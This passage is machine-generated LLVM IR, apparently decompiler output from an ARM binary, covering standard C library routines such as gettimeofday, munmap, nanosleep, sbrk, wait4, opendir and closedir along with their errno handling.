  %v4_1a754 = sext i16 %v3_1a754 to i32
  %v0_1a758 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a758 = sub i32 0, %v0_1a758
  store i32 %v1_1a758, i32* %r2.global-to-local, align 4
  %v3_1a75c = add i32 %v4_1a754, %v0_1a750
  %v4_1a75c = inttoptr i32 %v3_1a75c to i32*
  store i32 %v1_1a758, i32* %v4_1a75c, align 4
  br label %dec_label_pc_1a764

dec_label_pc_1a764:                               ; preds = %entry, %dec_label_pc_1a74c
  %v1_1a768 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1a74c ]
  ret i32 %v1_1a768

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1a764, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_1a780 = load i32, i32* @r0, align 4
  ret i32 %v1_1a780
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1a794 = load i32, i32* @r0, align 4
  ret i32 %v1_1a794
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_1a7a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 164) to i32*), align 4
  %v1_1a7a8 = inttoptr i32 %v4_1a7a4 to i32*
  %v2_1a7a8 = load i32, i32* %v1_1a7a8, align 4
  %v2_1a7ac = icmp eq i32 %v2_1a7a8, 0
  br i1 %v2_1a7ac, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_1a7b4 = phi i32 [ %v2_1a7a8, %entry ], [ 4096, %bb ]
  ret i32 %v1_1a7b4

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a7c0 = load i32, i32* @r7, align 4
  store i32 %v3_1a7c0, i32* %stack_var_-8, align 4
  %v0_1a7cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a7cc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a7cc, -4095
  br i1 %tmp, label %dec_label_pc_1a7f4, label %dec_label_pc_1a7dc

dec_label_pc_1a7dc:                               ; preds = %entry
  %v0_1a7e0 = call i32 @__aeabi_read_tp()
  %v3_1a7e4 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a7e4 = sext i16 %v3_1a7e4 to i32
  %v0_1a7e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a7e8 = sub i32 0, %v0_1a7e8
  store i32 %v1_1a7e8, i32* %r2.global-to-local, align 4
  %v3_1a7ec = add i32 %v4_1a7e4, %v0_1a7e0
  %v4_1a7ec = inttoptr i32 %v3_1a7ec to i32*
  store i32 %v1_1a7e8, i32* %v4_1a7ec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a7f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a7f4

dec_label_pc_1a7f4:                               ; preds = %entry, %dec_label_pc_1a7dc
  %v1_1a7f8 = phi i32 [ %v0_1a7cc, %entry ], [ -1, %dec_label_pc_1a7dc ]
  %v2_1a7f4 = phi i32 [ %v3_1a7c0, %entry ], [ %v2_1a7f4.pre, %dec_label_pc_1a7dc ]
  store i32 %v2_1a7f4, i32* @r7, align 4
  ret i32 %v1_1a7f8

; uselistorder directives
  uselistorder i32 %v0_1a7cc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a7f4, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_1a810 = load i32, i32* @r0, align 4
  ret i32 %v1_1a810
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a814 = load i32, i32* @r7, align 4
  store i32 %v3_1a814, i32* %stack_var_-8, align 4
  %v0_1a820 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a820, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_1a820, -4095
  br i1 %tmp, label %dec_label_pc_1a848, label %dec_label_pc_1a830

dec_label_pc_1a830:                               ; preds = %entry
  %v0_1a834 = call i32 @__aeabi_read_tp()
  %v3_1a838 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a838 = sext i16 %v3_1a838 to i32
  %v0_1a83c = load i32, i32* @r2, align 4
  %v1_1a83c = sub i32 0, %v0_1a83c
  store i32 %v1_1a83c, i32* @r2, align 4
  %v3_1a840 = add i32 %v4_1a838, %v0_1a834
  %v4_1a840 = inttoptr i32 %v3_1a840 to i32*
  store i32 %v1_1a83c, i32* %v4_1a840, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a848.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a848

dec_label_pc_1a848:                               ; preds = %entry, %dec_label_pc_1a830
  %v1_1a84c = phi i32 [ %v0_1a820, %entry ], [ -1, %dec_label_pc_1a830 ]
  %v2_1a848 = phi i32 [ %v3_1a814, %entry ], [ %v2_1a848.pre, %dec_label_pc_1a830 ]
  store i32 %v2_1a848, i32* @r7, align 4
  ret i32 %v1_1a84c

; uselistorder directives
  uselistorder i32 %v0_1a820, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a848, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a854 = load i32, i32* @r7, align 4
  store i32 %v3_1a854, i32* %stack_var_-8, align 4
  %v0_1a860 = load i32, i32* @r0, align 4
  store i32 %v0_1a860, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a860, -4095
  br i1 %tmp, label %dec_label_pc_1a888, label %dec_label_pc_1a870

dec_label_pc_1a870:                               ; preds = %entry
  %v0_1a874 = call i32 @__aeabi_read_tp()
  %v3_1a878 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a878 = sext i16 %v3_1a878 to i32
  %v0_1a87c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a87c = sub i32 0, %v0_1a87c
  store i32 %v1_1a87c, i32* %r2.global-to-local, align 4
  %v3_1a880 = add i32 %v4_1a878, %v0_1a874
  %v4_1a880 = inttoptr i32 %v3_1a880 to i32*
  store i32 %v1_1a87c, i32* %v4_1a880, align 4
  %v2_1a888.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a888

dec_label_pc_1a888:                               ; preds = %entry, %dec_label_pc_1a870
  %v1_1a88c = phi i32 [ %v0_1a860, %entry ], [ -1, %dec_label_pc_1a870 ]
  %v2_1a888 = phi i32 [ %v3_1a854, %entry ], [ %v2_1a888.pre, %dec_label_pc_1a870 ]
  store i32 %v2_1a888, i32* @r7, align 4
  ret i32 %v1_1a88c

; uselistorder directives
  uselistorder i32 %v0_1a860, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a888, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_1a8a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_1a8a4 = icmp eq i32 %v4_1a8a0, 0
  %v3_1a8a8 = load i32, i32* @r4, align 4
  %v9_1a8a8 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1a8a4, label %dec_label_pc_1a8b8, label %entry.dec_label_pc_1a8c0_crit_edge

entry.dec_label_pc_1a8c0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1a8c0

dec_label_pc_1a8b8:                               ; preds = %entry
  store i32 %v3_1a8a8, i32* @r4, align 4
  store i32 %v9_1a8a8, i32* @r6, align 4
  %v0_1a8bc = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_1a8c0

dec_label_pc_1a8c0:                               ; preds = %entry.dec_label_pc_1a8c0_crit_edge, %dec_label_pc_1a8b8
  %v0_1a8c0 = call i32 @__libc_enable_asynccancel()
  %v0_1a8c4 = load i32, i32* @r6, align 4
  store i32 %v0_1a8c4, i32* @r1, align 4
  store i32 %v0_1a8c0, i32* @r5, align 4
  %v0_1a8cc = load i32, i32* @r4, align 4
  store i32 %v0_1a8cc, i32* @r0, align 4
  %v0_1a8d0 = call i32 @__syscall_nanosleep()
  store i32 %v0_1a8d0, i32* @r4, align 4
  %v0_1a8d8 = load i32, i32* @r5, align 4
  %v1_1a8dc = call i32 @__libc_disable_asynccancel(i32 %v0_1a8d8)
  %v0_1a8e0 = load i32, i32* @r4, align 4
  ret i32 %v0_1a8e0

; uselistorder directives
  uselistorder label %dec_label_pc_1a8c0, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a8f4 = load i32, i32* @r4, align 4
  store i32 %v3_1a8f4, i32* %stack_var_-16, align 4
  store i32 29088, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r4.global-to-local, align 4
  %v4_1a904 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 29088) to i32*), align 4
  %v2_1a908 = icmp eq i32 %v4_1a904, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_1a908, label %dec_label_pc_1a914, label %dec_label_pc_1a924

dec_label_pc_1a914:                               ; preds = %entry
  %v1_1a918 = call i32 @__GI_brk(i32 0)
  %v1_1a91c = icmp slt i32 %v1_1a918, 0
  br i1 %v1_1a91c, label %dec_label_pc_1a948, label %dec_label_pc_1a924thread-pre-split

dec_label_pc_1a924thread-pre-split:               ; preds = %dec_label_pc_1a914
  %v0_1a928.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1a924.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1a924.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a924

dec_label_pc_1a924:                               ; preds = %dec_label_pc_1a924thread-pre-split, %entry
  %v1_1a924 = phi i32 [ %v1_1a924.pre, %dec_label_pc_1a924thread-pre-split ], [ 29088, %entry ]
  %v0_1a924 = phi i32 [ %v0_1a924.pre, %dec_label_pc_1a924thread-pre-split ], [ ptrtoint (i32* @global_var_32024.1324 to i32), %entry ]
  %v1_1a938 = phi i32 [ %v0_1a928.pr, %dec_label_pc_1a924thread-pre-split ], [ %arg1, %entry ]
  %v2_1a924 = add i32 %v0_1a924, %v1_1a924
  %v3_1a924 = inttoptr i32 %v2_1a924 to i32*
  %v4_1a924 = load i32, i32* %v3_1a924, align 4
  %v2_1a928 = icmp eq i32 %v1_1a938, 0
  store i32 %v4_1a924, i32* %r4.global-to-local, align 4
  br i1 %v2_1a928, label %dec_label_pc_1a94c, label %dec_label_pc_1a934

dec_label_pc_1a934:                               ; preds = %dec_label_pc_1a924
  %v2_1a938 = add i32 %v4_1a924, %v1_1a938
  %v1_1a93c = call i32 @__GI_brk(i32 %v2_1a938)
  %v1_1a940 = icmp slt i32 %v1_1a93c, 0
  br i1 %v1_1a940, label %dec_label_pc_1a948, label %dec_label_pc_1a934.dec_label_pc_1a94c_crit_edge

dec_label_pc_1a934.dec_label_pc_1a94c_crit_edge:  ; preds = %dec_label_pc_1a934
  %v0_1a94c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a94c

dec_label_pc_1a948:                               ; preds = %dec_label_pc_1a934, %dec_label_pc_1a914
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a94c

dec_label_pc_1a94c:                               ; preds = %dec_label_pc_1a924, %dec_label_pc_1a934.dec_label_pc_1a94c_crit_edge, %dec_label_pc_1a948
  %v0_1a94c = phi i32 [ %v0_1a94c.pre, %dec_label_pc_1a934.dec_label_pc_1a94c_crit_edge ], [ -1, %dec_label_pc_1a948 ], [ %v4_1a924, %dec_label_pc_1a924 ]
  %v2_1a950 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a950, i32* @r4, align 4
  ret i32 %v0_1a94c

; uselistorder directives
  uselistorder i32 %v4_1a924, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1a94c, { 2, 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1a98c, label %dec_label_pc_1a974

dec_label_pc_1a974:                               ; preds = %entry
  %v1_1a978 = sub i32 0, %arg1
  %v3_1a97c = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a97c = sext i16 %v3_1a97c to i32
  %v0_1a980 = call i32 @__aeabi_read_tp()
  %v3_1a984 = add i32 %v4_1a97c, %v0_1a980
  %v4_1a984 = inttoptr i32 %v3_1a984 to i32*
  store i32 %v1_1a978, i32* %v4_1a984, align 4
  br label %dec_label_pc_1a98c

dec_label_pc_1a98c:                               ; preds = %entry, %dec_label_pc_1a974
  %v1_1a990 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1a974 ]
  ret i32 %v1_1a990

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a98c, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1a99c = load i32, i32* %arg1, align 4
  store i32 %v2_1a99c, i32* %r3.global-to-local, align 4
  %v3_1a9a4 = icmp eq i32 %v2_1a99c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r6, align 4
  br i1 %v3_1a9a4, label %dec_label_pc_1a9b8, label %dec_label_pc_1a9d4

dec_label_pc_1a9b8:                               ; preds = %entry
  store i32 95936, i32* %r2.global-to-local, align 4
  %v0_1a9bc = call i32 @__aeabi_read_tp()
  %v3_1a9c0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a9c0 = sext i16 %v3_1a9c0 to i32
  store i32 %v4_1a9c0, i32* %r2.global-to-local, align 4
  %v0_1a9c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1a9c4, i32* %r1.global-to-local, align 4
  %v1_1a9c8 = add i32 %v0_1a9c4, 10
  store i32 %v1_1a9c8, i32* %r3.global-to-local, align 4
  %v3_1a9cc = add i32 %v4_1a9c0, %v0_1a9bc
  %v4_1a9cc = inttoptr i32 %v3_1a9cc to i32*
  store i32 %v1_1a9c8, i32* %v4_1a9cc, align 4
  %v0_1aa7c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aa7c

dec_label_pc_1a9d4:                               ; preds = %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_1a9d8 = add i32 %tmp, 24
  store i32 %v1_1a9d8, i32* %r2.global-to-local, align 4
  %v4_1a9e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 76) to i32*), align 4
  store i32 %v4_1a9e0, i32* %r1.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  %v4_1a9ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1a9ec)
  store i32 -1, i32* @r8, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_1aa04 = load i32, i32* @r6, align 4
  %v2_1aa04 = add i32 %v0_1aa04, 20
  %v3_1aa04 = inttoptr i32 %v2_1aa04 to i32*
  %v4_1aa04 = load i32, i32* %v3_1aa04, align 4
  call void @__pseudo_branch(i32 %v4_1aa04)
  %v0_1aa10 = load i32, i32* @r7, align 4
  %v1_1aa10 = inttoptr i32 %v0_1aa10 to i32*
  %v2_1aa10 = load i32, i32* %v1_1aa10, align 4
  store i32 %v2_1aa10, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_1aa20 = load i32, i32* @r8, align 4
  store i32 %v0_1aa20, i32* %v1_1aa10, align 4
  %v0_1aa24 = load i32, i32* @r6, align 4
  %v1_1aa24 = load i32, i32* %r3.global-to-local, align 4
  %v2_1aa24 = add i32 %v1_1aa24, %v0_1aa24
  %v3_1aa24 = inttoptr i32 %v2_1aa24 to i32*
  %v4_1aa24 = load i32, i32* %v3_1aa24, align 4
  store i32 ptrtoint (i32* @global_var_1aa30.1681 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1aa24)
  %v0_1aa30 = load i32, i32* @r7, align 4
  %v1_1aa30 = add i32 %v0_1aa30, 12
  %v2_1aa30 = inttoptr i32 %v1_1aa30 to i32*
  %v3_1aa30 = load i32, i32* %v2_1aa30, align 4
  store i32 %v3_1aa30, i32* @r0, align 4
  %v0_1aa34 = call i32 @free()
  %v0_1aa38 = load i32, i32* @r7, align 4
  store i32 %v0_1aa38, i32* @r0, align 4
  %v0_1aa3c = call i32 @free()
  %v0_1aa44 = load i32, i32* @r4, align 4
  store i32 %v0_1aa44, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_1aa44, -4095
  br i1 %tmp11, label %dec_label_pc_1aa78, label %dec_label_pc_1aa60

dec_label_pc_1aa60:                               ; preds = %dec_label_pc_1a9d4
  store i32 95768, i32* %r3.global-to-local, align 4
  %v0_1aa64 = call i32 @__aeabi_read_tp()
  %v3_1aa68 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1aa68 = sext i16 %v3_1aa68 to i32
  store i32 %v4_1aa68, i32* %r3.global-to-local, align 4
  %v0_1aa6c = load i32, i32* %r2.global-to-local, align 4
  %v1_1aa6c = sub i32 0, %v0_1aa6c
  store i32 %v1_1aa6c, i32* %r2.global-to-local, align 4
  %v3_1aa70 = add i32 %v4_1aa68, %v0_1aa64
  %v4_1aa70 = inttoptr i32 %v3_1aa70 to i32*
  store i32 %v1_1aa6c, i32* %v4_1aa70, align 4
  %v0_1aa74 = load i32, i32* @r8, align 4
  br label %dec_label_pc_1aa78

dec_label_pc_1aa78:                               ; preds = %dec_label_pc_1a9d4, %dec_label_pc_1aa60
  %v0_1aa78 = phi i32 [ %v0_1aa44, %dec_label_pc_1a9d4 ], [ %v0_1aa74, %dec_label_pc_1aa60 ]
  store i32 %v0_1aa78, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aa7c

dec_label_pc_1aa7c:                               ; preds = %dec_label_pc_1a9b8, %dec_label_pc_1aa78
  %v0_1aa7c = phi i32 [ %v0_1aa7c.pre, %dec_label_pc_1a9b8 ], [ %v0_1aa78, %dec_label_pc_1aa78 ]
  ret i32 %v0_1aa7c

; uselistorder directives
  uselistorder i32 %v0_1aa44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1aa7c, { 1, 0 }
  uselistorder label %dec_label_pc_1aa78, { 1, 0 }
}

define i32 @function_1aa94(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1aa94:
  %v0_1aa94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1aa94, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1aa94
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1aa94, %bb
  %v10_1aaa4 = phi i32 [ %arg1, %dec_label_pc_1aa94 ], [ 0, %bb ]
  ret i32 %v10_1aaa4

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_1aaa8 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_1aabc = call i32 @malloc(i32 48)
  %v2_1aac4 = icmp eq i32 %v1_1aabc, 0
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r6, align 4
  br i1 %v2_1aac4, label %bb, label %dec_label_pc_1aad4

bb:                                               ; preds = %entry
  br label %dec_label_pc_1ab60

dec_label_pc_1aad4:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1aad8 = load i32, i32* @r4, align 4
  %v2_1aad8 = icmp ugt i32 %v0_1aad8, 511
  %v2_1aadc = add i32 %v1_1aabc, 4
  %v3_1aadc = inttoptr i32 %v2_1aadc to i32*
  store i32 0, i32* %v3_1aadc, align 4
  %v0_1aae0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1aae0 = add i32 %v1_1aabc, 16
  %v3_1aae0 = inttoptr i32 %v2_1aae0 to i32*
  store i32 %v0_1aae0, i32* %v3_1aae0, align 4
  %v0_1aae4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1aae4 = add i32 %v1_1aabc, 8
  %v3_1aae4 = inttoptr i32 %v2_1aae4 to i32*
  store i32 %v0_1aae4, i32* %v3_1aae4, align 4
  br i1 %v2_1aad8, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_1aad4
  %v0_1aaec2 = load i32, i32* @r4, align 4
  %v2_1aaec3 = add i32 %v1_1aabc, 20
  %v3_1aaec4 = inttoptr i32 %v2_1aaec3 to i32*
  store i32 %v0_1aaec2, i32* %v3_1aaec4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_1aad4
  %v1_1aae8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1aae8 = add i32 %v1_1aae8, 512
  store i32 %v2_1aae8, i32* %r3.global-to-local, align 4
  %v0_1aaec = load i32, i32* @r4, align 4
  %v2_1aaec = add i32 %v1_1aabc, 20
  %v3_1aaec = inttoptr i32 %v2_1aaec to i32*
  store i32 %v0_1aaec, i32* %v3_1aaec, align 4
  %v1_1aaf0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1aaf0, i32* %v3_1aaec, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_1aabc, i32* @r5, align 4
  %v0_1aaf8 = load i32, i32* @r7, align 4
  %v2_1aaf8 = inttoptr i32 %v1_1aabc to i32*
  store i32 %v0_1aaf8, i32* %v2_1aaf8, align 4
  %v0_1aafc = load i32, i32* @r5, align 4
  %v1_1aafc = add i32 %v0_1aafc, 20
  %v2_1aafc = inttoptr i32 %v1_1aafc to i32*
  %v3_1aafc = load i32, i32* %v2_1aafc, align 4
  store i32 %v3_1aafc, i32* %r1.global-to-local, align 4
  %v2_1ab04 = call i32 @calloc(i32 1, i32 %v3_1aafc)
  %v2_1ab08 = icmp eq i32 %v2_1ab04, 0
  store i32 %v2_1ab04, i32* @r4, align 4
  %v1_1ab10 = load i32, i32* @r5, align 4
  %v2_1ab10 = add i32 %v1_1ab10, 12
  %v3_1ab10 = inttoptr i32 %v2_1ab10 to i32*
  store i32 %v2_1ab04, i32* %v3_1ab10, align 4
  br i1 %v2_1ab08, label %dec_label_pc_1ab18, label %dec_label_pc_1ab28

dec_label_pc_1ab18:                               ; preds = %bb17
  %v0_1ab18 = load i32, i32* @r5, align 4
  store i32 %v0_1ab18, i32* @r0, align 4
  %v0_1ab1c = call i32 @free()
  %v0_1ab20 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1ab60

dec_label_pc_1ab28:                               ; preds = %bb17
  %v0_1ab2c = load i32, i32* @r6, align 4
  %v2_1ab2c = add i32 %v0_1ab2c, -34804
  store i32 %v2_1ab2c, i32* %r3.global-to-local, align 4
  %v1_1ab34 = inttoptr i32 %v2_1ab2c to i32*
  %v2_1ab34 = load i32, i32* %v1_1ab34, align 4
  %v3_1ab34 = add i32 %v0_1ab2c, -34800
  %v4_1ab34 = inttoptr i32 %v3_1ab34 to i32*
  %v5_1ab34 = load i32, i32* %v4_1ab34, align 4
  store i32 %v5_1ab34, i32* %r1.global-to-local, align 4
  %v6_1ab34 = add i32 %v0_1ab2c, -34796
  %v7_1ab34 = inttoptr i32 %v6_1ab34 to i32*
  %v8_1ab34 = load i32, i32* %v7_1ab34, align 4
  store i32 %v8_1ab34, i32* %r2.global-to-local, align 4
  %v9_1ab34 = add i32 %v0_1ab2c, -34792
  %v10_1ab34 = inttoptr i32 %v9_1ab34 to i32*
  %v11_1ab34 = load i32, i32* %v10_1ab34, align 4
  store i32 %v11_1ab34, i32* %r3.global-to-local, align 4
  %v12_1ab34 = add i32 %v0_1ab2c, -34788
  %v1_1ab40 = inttoptr i32 %v12_1ab34 to i32*
  %v2_1ab40 = load i32, i32* %v1_1ab40, align 4
  %v3_1ab40 = add i32 %v0_1ab2c, -34784
  %v4_1ab40 = inttoptr i32 %v3_1ab40 to i32*
  %v5_1ab40 = load i32, i32* %v4_1ab40, align 4
  store i32 %v2_1ab40, i32* %stack_var_-32, align 4
  store i32 %v5_1ab34, i32* %r1.global-to-local, align 4
  store i32 %v8_1ab34, i32* %r2.global-to-local, align 4
  store i32 %v11_1ab34, i32* %r3.global-to-local, align 4
  %v0_1ab50 = load i32, i32* @r5, align 4
  %v1_1ab50 = add i32 %v0_1ab50, 24
  %v1_1ab54 = inttoptr i32 %v1_1ab50 to i32*
  store i32 %v2_1ab34, i32* %v1_1ab54, align 4
  %v3_1ab54 = add i32 %v0_1ab50, 28
  %v4_1ab54 = inttoptr i32 %v3_1ab54 to i32*
  %v5_1ab54 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1ab54, i32* %v4_1ab54, align 4
  %v6_1ab54 = add i32 %v0_1ab50, 32
  %v7_1ab54 = inttoptr i32 %v6_1ab54 to i32*
  %v8_1ab54 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1ab54, i32* %v7_1ab54, align 4
  %v9_1ab54 = add i32 %v0_1ab50, 36
  %v10_1ab54 = inttoptr i32 %v9_1ab54 to i32*
  %v11_1ab54 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1ab54, i32* %v10_1ab54, align 4
  %v12_1ab54 = add i32 %v0_1ab50, 40
  %v2_1ab58 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_1ab40, i32* %r1.global-to-local, align 4
  %v1_1ab5c = inttoptr i32 %v12_1ab54 to i32*
  store i32 %v2_1ab58, i32* %v1_1ab5c, align 4
  %v3_1ab5c = add i32 %v0_1ab50, 44
  %v4_1ab5c = inttoptr i32 %v3_1ab5c to i32*
  %v5_1ab5c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1ab5c, i32* %v4_1ab5c, align 4
  %v0_1ab60.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ab60

dec_label_pc_1ab60:                               ; preds = %bb, %dec_label_pc_1ab18, %dec_label_pc_1ab28
  %v0_1ab60 = phi i32 [ 0, %bb ], [ %v0_1ab20, %dec_label_pc_1ab18 ], [ %v0_1ab60.pre, %dec_label_pc_1ab28 ]
  store i32 %v12_1aaa8, i32* @r7, align 4
  ret i32 %v0_1ab60

; uselistorder directives
  uselistorder i32 %v2_1ab04, { 1, 0, 2 }
  uselistorder i32 %v1_1aabc, { 2, 1, 5, 0, 6, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1ab60, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_1ab80 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_1abb0, label %dec_label_pc_1ab98

dec_label_pc_1ab98:                               ; preds = %entry
  %v0_1ab9c = call i32 @__aeabi_read_tp()
  %v3_1aba0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1aba0 = sext i16 %v3_1aba0 to i32
  %v0_1aba4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1aba4 = sub i32 0, %v0_1aba4
  store i32 %v1_1aba4, i32* %r2.global-to-local, align 4
  %v3_1aba8 = add i32 %v4_1aba0, %v0_1ab9c
  %v4_1aba8 = inttoptr i32 %v3_1aba8 to i32*
  store i32 %v1_1aba4, i32* %v4_1aba8, align 4
  br label %dec_label_pc_1abd4

dec_label_pc_1abb0:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_1abb0 = icmp slt i32 %arg1, 0
  br i1 %v1_1abb0, label %dec_label_pc_1abd4, label %dec_label_pc_1abb8

